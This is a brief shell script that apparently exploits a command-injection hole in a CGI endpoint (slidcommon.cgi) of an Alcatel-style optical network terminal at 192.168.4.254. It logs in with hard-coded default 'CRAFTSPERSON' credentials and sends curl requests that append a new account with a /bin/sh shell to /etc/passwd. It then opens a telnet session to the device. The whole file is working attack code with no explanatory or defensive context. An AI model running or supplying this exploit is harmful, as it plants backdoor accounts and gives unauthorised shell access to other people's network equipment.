echo Adding an user ONT / ALC\#FGU

curl -s --data 'CMD=echo -n $(echo -n ONT:\$>>/etc/passwd)' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
curl -s --data 'CMD=echo -n $(echo -n 2\$>>/etc/passwd)' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
curl -s --data 'CMD=echo $(echo 367ffe585fc3070eabc901c03cd561d062ce1b67:100:100::/tmp:/bin/sh>>/etc/passwd)' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null

telnet 192.168.4.254
